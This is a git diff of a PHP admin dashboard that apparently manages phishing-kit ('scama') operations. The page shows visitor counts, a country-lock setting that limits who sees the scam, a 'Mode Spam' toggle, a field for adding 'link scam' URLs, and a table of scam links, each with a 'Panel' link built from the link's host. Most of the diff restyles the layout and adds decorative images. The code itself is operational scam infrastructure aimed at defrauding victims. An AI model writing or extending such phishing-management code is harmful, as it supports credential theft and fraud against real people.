@@ -5,7 +5,6 @@ $get_codeCountry = json_decode(file_get_contents("../core/code_country.json"), t
 include('template/header.php');
 
 ?>
-
 <div class="container">
     <!-- Page Sidebar Ends-->
     <div class="page-body">
@@ -14,40 +13,53 @@ include('template/header.php');
             <div class="row starter-main">
                 <div class="col-sm-6 mb-2">
                     <div class="card-visit">
-                        <div class="text-center">
-                            <h4>Visitor</h4>
+                        <div class="img-sagiri-home">
+                            <img class="img-los" src="../assets/img/bingung.png" alt="sagiri">
                         </div>
-                        <div class="text-center">
-                            <h2><?php
-                                $visitor = getVisitor();
-                                echo count($visitor);
-                                ?></h2>
+                        <div class="blam">
+                            <div class="text-center">
+                                <h4>Visitor</h4>
+                            </div>
+                            <div class="text-center">
+                                <h2><?php
+                                    $visitor = getVisitor();
+                                    echo count($visitor);
+                                    ?></h2>
+                            </div>
                         </div>
                     </div>
                 </div>
                 <div class="col-sm-6 mb-2">
                     <div class="card-visit">
-                        <div class="text-center">
-                            <h4>Visitor <?= getCountryLock()[0]['country']; ?></h4>
+                        <div class="img-sagiri-side">
+                            <img class="img-losa" src="../assets/img/bikini.png" alt="sagiri">
                         </div>
-                        <div class="text-center">
-                            <h2>
-                                <?php
-                                $visitor = getVisitor();
-                                $count = 0;
-                                foreach ($visitor as $key => $value) {
-                                    if ($value['code_country'] == getCountryLock()[0]['country']) {
-                                        $count++;
+                        <div class="blam">
+                            <div class="text-center">
+                                <h4>Visitor <?= getCountryLock()[0]['country']; ?></h4>
+                            </div>
+                            <div class="text-center">
+                                <h2>
+                                    <?php
+                                    $visitor = getVisitor();
+                                    $count = 0;
+                                    foreach ($visitor as $key => $value) {
+                                        if ($value['code_country'] == getCountryLock()[0]['country']) {
+                                            $count++;
+                                        }
                                     }
-                                }
-                                echo $count;
-                                ?>
-                            </h2>
+                                    echo $count;
+                                    ?>
+                                </h2>
+                            </div>
                         </div>
                     </div>
                 </div>
                 <div class="col-sm-12 mb-2">
                     <div class="card-settings">
+                        <div class="img-sagiri-side">
+                            <img class="img-losa" src="../assets/img/sekolah.png" alt="sagiri">
+                        </div>
                         <form>
                             <div class="mb-2">
                                 <h5 style="text-transform: uppercase;">Mode Spam</h5>
@@ -64,19 +76,15 @@ include('template/header.php');
                                     $update = '';
                                 }
                                 ?>
-                                <input id="mode" type="checkbox" <?= $status ?> data-toggle="toggle"
-                                    data-onstyle="light">
+                                <input id="mode" type="checkbox" <?= $status ?> data-toggle="toggle" data-onstyle="light">
                             </div>
                             <h5 style="text-transform: uppercase;">Link SEttings</h5>
                             <div class="mb-2 row">
                                 <div class="col-lg-12">
                                     <div class="input-group">
-                                        <input name="link" class="form-control btn-square" placeholder="link scam"
-                                            type="text">
+                                        <input name="link" class="form-control btn-square" placeholder="link scam" type="text">
 
-                                        <button <?= $update ?> type="button" id="linkscam"
-                                            class="input-group-text btn btn-secondary btn-right"><i
-                                                class="icon-plus"></i> Update
+                                        <button <?= $update ?> type="button" id="linkscam" class="input-group-text btn btn-secondary btn-right"><i class="icon-plus"></i> Update
                                         </button>
                                     </div>
                                 </div>
@@ -95,9 +103,7 @@ include('template/header.php');
 
                                         </select>
 
-                                        <button <?= $update ?> type="button" id="countrylock"
-                                            class="input-group-text btn btn-secondary btn-right"><i
-                                                class="icon-plus"></i> Update
+                                        <button <?= $update ?> type="button" id="countrylock" class="input-group-text btn btn-secondary btn-right"><i class="icon-plus"></i> Update
                                         </button>
                                     </div>
                                 </div>
@@ -108,64 +114,67 @@ include('template/header.php');
                 </div>
                 <div class="col-sm-12">
                     <div class="card-status">
-                        <h5 style="text-transform: uppercase;">Status</h5>
-                        <table class="table table-bordered table-fixed-header">
-                            <thead>
-                                <tr>
-                                    <th>Country Lock</th>
-                                    <th>Code</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
+                        <div class="img-sagiri-side">
+                            <img class="img-losa" src="../assets/img/hot.png" alt="sagiri">
+                        </div>
+                        <div class="status-blam">
+                            <h5 style="text-transform: uppercase;">Status</h5>
+                            <table class="table table-bordered table-fixed-header">
+                                <thead>
+                                    <tr>
+                                        <th>Country Lock</th>
+                                        <th>Code</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <?php
+
+                                        $country_lock = getCountryLock()[0];
+                                        $country_mix = $get_codeCountry[$country_lock['country']];
+
+                                        ?>
+                                        <td><?= $country_mix ?></td>
+                                        <td><?= $country_lock['country']; ?></td>
+                                    </tr>
+
+                                </tbody>
+                            </table>
+
+                            <table id="datatable" class="table  table-hover table-fixed-header">
+                                <thead>
+                                    <tr>
+                                        <th>Link Scam</th>
+                                        <th>Action</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
                                     <?php
+                                    $scama = getScama();
 
-                                    $country_lock = getCountryLock()[0];
-                                    $country_mix = $get_codeCountry[$country_lock['country']];
-
+                                    foreach ($scama as $value) {
+                                        $linksc = $value['link_sc'];
+                                        $idlinksc = $value['idlink_scama'];
+                                        $panel = explode('/', $linksc)[2];
+                                        $panel = "https://$panel/beonPnl";
                                     ?>
-                                    <td><?= $country_mix ?></td>
-                                    <td><?= $country_lock['country']; ?></td>
-                                </tr>
+                                        <tr>
+                                            <td><?= $linksc  ?></td>
+                                            <td>
+                                                <button id="<?= $idlinksc ?>" class="btn btn-danger btn-sm trash"><i class="icon-trash"></i>
+                                                    Delete</button> |
 
-                            </tbody>
-                        </table>
+                                                <a href="<?= $panel ?>" target="_blank" class="btn btn-warning btn-sm"><i class="icon-user"></i>
+                                                    Panel</a>
 
-                        <table id="datatable" class="table  table-hover table-fixed-header">
-                            <thead>
-                                <tr>
-                                    <th>Link Scam</th>
-                                    <th>Action</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <?php
-                                $scama = getScama();
-
-                                foreach ($scama as $value) {
-                                    $linksc = $value['link_sc'];
-                                    $idlinksc = $value['idlink_scama'];
-                                    $panel = explode('/', $linksc)[2];
-                                    $panel = "https://$panel/beonPnl";
-                                ?>
-                                <tr>
-                                    <td><?= $linksc  ?></td>
-                                    <td>
-                                        <button id="<?= $idlinksc ?>" class="btn btn-danger btn-sm trash"><i
-                                                class="icon-trash"></i>
-                                            Delete</button> |
-
-                                        <a href="<?= $panel ?>" target="_blank" class="btn btn-warning btn-sm"><i
-                                                class="icon-user"></i>
-                                            Panel</a>
-
-                                    </td>
-                                </tr>
-                                <?php
-                                }
-                                ?>
-                            </tbody>
-                        </table>
+                                            </td>
+                                        </tr>
+                                    <?php
+                                    }
+                                    ?>
+                                </tbody>
+                            </table>
+                        </div>
                     </div>
                 </div>
             </div>
